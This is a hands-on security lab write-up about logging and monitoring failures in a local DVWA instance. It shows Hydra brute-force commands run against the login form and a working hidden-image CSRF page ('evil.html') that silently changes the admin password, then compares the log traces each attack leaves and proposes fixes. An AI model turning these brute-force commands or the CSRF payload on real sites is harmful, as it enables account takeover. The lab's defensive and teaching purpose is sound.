# Security Logging & Monitoring Failures — DVWA (Low Security)

**OWASP Category:** A09:2021 – Security Logging and Monitoring Failures (with a hands-on CSRF exploit used as the practical case study)
**Target:** DVWA "Brute Force" login flow and DVWA "CSRF" module
**Security Level Tested:** Low
**Evidence format:** This write-up uses real terminal output and Apache access-log excerpts, reproduced verbatim below, instead of screenshots.

---

## 1. Overview

Security Logging and Monitoring Failures is different from most OWASP categories in that it isn't caused by one flawed line of code — it's a failure of *visibility*. Logs may technically exist, but if they don't unambiguously record what happened, and nothing is actively correlating or alerting on them, an attack can succeed in plain sight without anyone noticing.

This lab explored that idea from two angles against the same target application:

1. **Brute force** — a *loud* attack. Manual and automated (Hydra) login attempts were run against DVWA's login form while live-tailing the Apache access log, to see exactly what does and doesn't get captured, and why an automated tool can be fooled in both directions (false positive and false negative) by the same target.
2. **CSRF (Cross-Site Request Forgery)** — a *quiet* attack. A real CSRF exploit was built and executed against DVWA's password-change form, then the resulting log entry was compared against the brute-force traffic to show that this class of attack leaves a nearly clean log line — proving that for CSRF, logging cannot substitute for prevention.

---

## 2. Environment

| Component | Details |
|---|---|
| Target | DVWA (Damn Vulnerable Web Application), v1.10 *Development* |
| Deployment | Docker (`vulnerables/web-dvwa`), container `vigorous_ritchie`, `localhost:8080` |
| Host OS | Windows 11 |
| Attacker/tooling environment | Kali Linux via WSL2 |
| Tools | `docker exec` / `docker cp`, Apache `access.log` (live-tailed), Hydra (THC-Hydra v9.7), a locally hosted HTML file for the CSRF payload |

---

## 3. Steps to Reproduce

### 3.1 Establishing a log monitoring baseline

The Apache access log inside the container was tailed live for the entire lab, acting as the "monitoring console" against which every subsequent action was checked:

```bash
docker exec -it vigorous_ritchie tail -f /var/log/apache2/access.log
```

**Baseline — successful login:**

```
172.17.0.1 - - "GET /login.php HTTP/1.1" 200 1066 "http://localhost:8080/login.php" "Mozilla/5.0 ..."
172.17.0.1 - - "POST /login.php HTTP/1.1" 302 337 "http://localhost:8080/login.php" "Mozilla/5.0 ..."
172.17.0.1 - - "GET /index.php HTTP/1.1" 200 3036 "http://localhost:8080/login.php" "Mozilla/5.0 ..."
```

**Baseline — failed login (wrong password):**

```
172.17.0.1 - - "POST /login.php HTTP/1.1" 302 337 "http://localhost:8080/login.php" "Mozilla/5.0 ..."
172.17.0.1 - - "GET /login.php HTTP/1.1" 200 1067 "http://localhost:8080/login.php" "Mozilla/5.0 ..."
```

**Finding:** the `POST /login.php` line itself is identical in shape (status `302`, near-identical byte size) whether the login succeeded or failed. The *only* way to tell them apart is to look at which page the following `GET` request lands on (`index.php` vs. `login.php` again). Apache's default access log gives no direct, single-line signal for authentication outcome — a real detection rule would have to stitch two lines together and know the application's redirect behavior in advance.

### 3.2 Manual rapid login attempts (rhythm-based signal)

Eight incorrect-password submissions were sent in quick succession to observe timing:

```
04:15:34 → 04:15:38 → 04:15:43 → 04:15:45 → 04:15:50 → 04:15:54 → 04:15:58 → 04:16:06
```

**Finding:** roughly 3–5 seconds between attempts, sustained for over 30 seconds — a rhythm no human normally produces when actually trying to recall a password. This is visible to a human eye watching `tail -f` in real time, but at production scale, with real traffic volume, nobody manually watches a raw access log. This is exactly the gap the OWASP category describes: logs captured the pattern, but nothing was set up to notice it.

### 3.3 Automated brute force with Hydra — attempt 1 (failure-string detection)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 \
  http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

**Result:** Hydra reported **16 of 16** tested passwords as "valid" — including passwords known to be wrong (`monkey`, `iloveyou`, `nicole`, `123456`, etc.).

**Root cause:** DVWA's `POST /login.php` response is a `302` redirect with an empty body on both success and failure — the string `"Login failed"` only appears on the *next* page load, after the redirect is followed. Hydra's `F=` check inspects the immediate response body, never finds the string, and defaults every attempt to "success." This is a **false positive on every single attempt**, driven directly by the same log/response ambiguity identified in Section 3.1.

### 3.4 Automated brute force with Hydra — attempt 2 (success-string detection)

```bash
hydra -l admin -P /tmp/small.txt 127.0.0.1 -s 8080 \
  http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:S=index.php" -V
```

(`/tmp/small.txt` contained: `123456`, `letmein`, `password123`, `password`, `admin123` — the last of which, `password`, is the real, previously confirmed DVWA credential.)

**Result:** **0 of 5** passwords reported valid — including the one known-correct password. A **false negative** this time, in the opposite direction from attempt 1.

### 3.5 Root cause of the false negative — debug mode

Re-running with `-d` (debug) surfaced the actual HTML returned by the server on every attempt, including the correct-password attempt. The raw request sent by Hydra for the correct password was visible in the debug trace:

```
HTTP request sent:
POST /login.php HTTP/1.0
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Hydra)
Cookie: PHPSESSID=ub1sbichhpsaohhtqolnojkvn4; security=low

username=admin&password=password&Login=Login
```

And the response body, extracted from the debug hex dump's ASCII column, contained:

```html
<div class="message">CSRF token is incorrect</div>
```

**Root cause confirmed:** every attempt — including the correct password — was rejected at DVWA's CSRF-token validation step, before the credentials were ever checked. Hydra's basic HTTP-POST-form module sends a static, hardcoded request body; it never performs a preceding `GET` to scrape a fresh `user_token` value, so every submission carries an invalid or missing token and is rejected outright.

### 3.6 Reading DVWA's actual `login.php` source

```bash
docker cp vigorous_ritchie:/var/www/html/login.php ./login.php
```

Relevant extracted code, confirmed directly from the container:

```php
if( isset( $_POST[ 'Login' ] ) ) {
    // Anti-CSRF
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'login.php' );

    $user = $_POST[ 'username' ];
    ...
    $query = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";
    ...
    if( $result && mysqli_num_rows( $result ) == 1 ) {
        dvwaLogin( $user );
        dvwaRedirect( 'index.php' );
    }
    // Login failed
    dvwaMessagePush( 'Login failed' );
    dvwaRedirect( 'login.php' );
}
...
// Anti-CSRF
generateSessionToken();
```

**Confirmed:** `checkToken()` runs before any credential comparison, exactly as the debug trace implied. Just as importantly, a full read of this file shows **no logging call of any kind** — no `error_log()`, no attempt counter, no lockout logic, no alerting hook — on either the success or the failure branch. The CSRF token happened to blunt one unsophisticated tool run, but it was never designed as, and does not function as, a brute-force or logging control. A scripted attacker who scrapes the token first (a small addition to any Python `requests`-based script) would face zero resistance and generate zero application-level audit trail.

### 3.7 Log signature comparison: Hydra traffic

Apache log lines generated during the Hydra run:

```
172.17.0.1 - - [05/Sep/2026:04:31:39 +0000] "GET /login.php HTTP/1.0" 200 1956 "-" "Mozilla/5.0 (Hydra)"
172.17.0.1 - - [05/Sep/2026:04:31:39 +0000] "GET /login.php HTTP/1.0" 200 1956 "-" "Mozilla/5.0 (Hydra)"
172.17.0.1 - - [05/Sep/2026:04:31:39 +0000] "POST /login.php HTTP/1.0" 302 300 "-" "Mozilla/5.0 (Hydra)"
172.17.0.1 - - [05/Sep/2026:04:31:39 +0000] "POST /login.php HTTP/1.0" 302 300 "-" "Mozilla/5.0 (Hydra)"
172.17.0.1 - - [05/Sep/2026:04:31:39 +0000] "GET /login.php HTTP/1.0" 200 1864 "-" "Mozilla/5.0 (Hydra)"
```

**Automation indicators present in this batch alone:**
- Multiple requests sharing the **exact same timestamp** (down to the second) — not achievable by a human
- User-Agent string **literally contains the word "Hydra"**
- `Referer` field is blank (`"-"`) on every line
- `HTTP/1.0` used throughout — most modern browsers negotiate `HTTP/1.1`

### 3.8 Locating DVWA's CSRF module form

Viewed via browser "View Source" at `http://localhost:8080/vulnerabilities/csrf/`:

```html
<form action="#" method="GET">
    New password:<br />
    <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
    Confirm new password:<br />
    <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
    <br />
    <input type="submit" value="Change" name="Change">
</form>
```

**Two observations directly from this markup:**
1. `method="GET"` — the password change is submitted as URL parameters, not a POST body.
2. There is **no hidden `user_token` field anywhere in this form** — unlike `login.php`, which embeds one via `tokenField()`. (Note: this observation is based on the rendered page source; the module's underlying PHP was not extracted from the container the way `login.php` was, so this write-up describes the *absence of a token in the delivered form and confirmed exploit success without one* — not a direct read of `csrf.php`'s source.)

### 3.9 Building and firing the CSRF exploit

Saved locally as `evil.html`:

```html
<html>
<body>
<h3>Congratulations! Click below to claim your prize!</h3>
<img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" width="0" height="0" border="0">
</body>
</html>
```

**Precondition confirmed:** the browser had a valid, active DVWA session (`index.php` loaded without redirecting to the login page).

**Mechanism:** the invisible (`0x0`) `<img>` tag causes the browser to issue a `GET` request to "load" the image. Because the browser already held a valid `PHPSESSID` cookie for `localhost:8080`, that cookie was attached automatically — the attacker's page never touched or saw the cookie itself, unlike a cookie-theft attack.

`evil.html` was opened directly (as a local `file://` page) in the same browser that held the active DVWA session.

**Verification:** logged out of DVWA, then logged back in with username `admin` and the attacker-chosen password `hacked123` — **login succeeded**, confirming the admin password had been silently changed with no re-authentication step and no visible user interaction beyond opening a page.

### 3.10 Locating the CSRF request in the access log

```bash
docker exec vigorous_ritchie grep "password_new" /var/log/apache2/access.log
```

**Result:**

```
172.17.0.1 - - [05/Sep/2026:05:59:07 +0000] "GET /vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change HTTP/1.1" 302 485 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 CCleaner/151.0.0.0"
```

---

## 4. Why It Worked

**Brute force (Hydra) was blocked, but only by accident.** DVWA's login form validates a session-bound CSRF token before checking credentials at all. This is a real, working control against naive, static-request tools — but it is a side effect of a control designed for a different purpose. Nothing in `login.php` tracks failed attempts, throttles requests, or logs an auditable authentication event. A tool that scrapes the token per-request would face no resistance whatsoever.

**CSRF succeeded because two protections were both absent on the same endpoint.** The password-change form used `method="GET"` (so a bare, invisible resource-loading tag was enough to trigger it) and delivered no anti-CSRF token — the exact protection `login.php` demonstrably has. The browser's own same-origin cookie behavior did the rest: any request to `localhost:8080` while authenticated there automatically carries the session cookie, regardless of which page initiated the request.

**The connecting thread for A09 specifically:** comparing the two attacks' log footprints side by side shows why this OWASP category is about more than "turn logging on."

| Signal | Brute force (Hydra) | CSRF attack |
|---|---|---|
| Source IP | Attacker's own | **Victim's own machine — indistinguishable from legitimate use** |
| User-Agent | Contains the tool's literal name | **Ordinary, real browser string** |
| Request timing | Multiple requests sharing one timestamp | **Single request, normal timing** |
| Referer | Blank | **Also blank — but this is the only anomaly present** |

Brute force is loud and detectable with a simple correlation rule (rate + tool-signature + timestamp clustering). **CSRF produced almost no anomaly at all** — the request came from a legitimate IP, with a real browser, at a normal pace. The single weak signal (a blank `Referer` on a state-changing request) is not something most default logging setups treat as suspicious. For this class of vulnerability, **detection cannot substitute for prevention** — the fix has to be in the application (tokens + POST-only state changes), not in a monitoring rule written after the fact.

---

## 5. Impact & Fix

**Impact:** An attacker able to get a logged-in victim to simply open or view a page (email, forum post, ad, compromised site) could silently change that victim's password with zero credential knowledge and, in this lab, zero visible trace beyond one ordinary-looking log line. Chained with the missing brute-force logging, an organization running this configuration would have no reliable way to reconstruct *who* changed a password, or *when* an account was actually compromised versus legitimately accessed.

**Fixes:**

| Finding | Fix |
|---|---|
| No auditable login success/failure log | Add explicit application-level logging (e.g. `error_log()` or structured JSON) recording `LOGIN_SUCCESS` / `LOGIN_FAILURE`, the attempted username, source IP, and timestamp — do not rely on HTTP status codes alone |
| No brute-force throttling | Add per-IP and/or per-account rate limiting and temporary account lockout after N consecutive failures |
| CSRF token blocking brute force is incidental | Implement rate limiting/lockout as a dedicated control, independent of CSRF protection |
| CSRF-vulnerable password-change endpoint | Add the same `checkToken()` validation `login.php` already uses, and change the form's `method` from `GET` to `POST` so a bare resource-loading tag can no longer trigger it |
| CSRF attacks are nearly invisible in logs | Do not rely on log-based detection for this vulnerability class — the token check is the actual control; monitoring is a secondary layer at best |

**Suggested `login.php` audit-logging addition (illustrative, not a verified official DVWA patch):**

```php
if( isset( $_POST[ 'Login' ] ) ) {
    checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'login.php' );

    $ip = $_SERVER['REMOTE_ADDR'];
    $attempted_user = $_POST['username'];

    if ( /* credentials valid, existing DVWA logic */ ) {
        error_log("[AUTH_SUCCESS] user={$attempted_user} ip={$ip} time=" . date('c'));
    } else {
        error_log("[AUTH_FAILURE] user={$attempted_user} ip={$ip} time=" . date('c'));
        // increment a per-IP failure counter and lock out / delay after a threshold
    }
}
```

**Suggested CSRF-module fix (illustrative, following the exact pattern already present in `login.php`):**

```php
// Before processing the password change:
checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'csrf.php' );
// Change the form's method="GET" to method="POST"
// Call generateSessionToken() on every page render, same as login.php
```

---

## 6. Real-World Relevance

- **A02:2017 (Broken Authentication)-style credential stuffing and A09-style logging gaps go hand in hand** — real breach post-mortems routinely find that brute-force activity was technically present in logs for weeks before anyone noticed, because no alerting was ever built on top of the raw data.
- **Hydra, sqlmap, Nikto, and similar tools ship with distinctive default User-Agent strings** — flagging these in a WAF or log-correlation rule is one of the highest-value, lowest-effort detections a defender can implement, and this lab shows exactly why (the tool literally identified itself).
- **CSRF has caused real damage historically** in router admin panels, banking transfer forms, and email-forwarding settings — anywhere a logged-in user's browser could be tricked into firing one authenticated request. This lab reproduces that exact mechanism end-to-end.
- **This lab is a direct illustration of why A09 is graded as its own category**: the vulnerability isn't a single flawed line of code, it's the absence of a discipline — logging what matters, and watching what's logged.

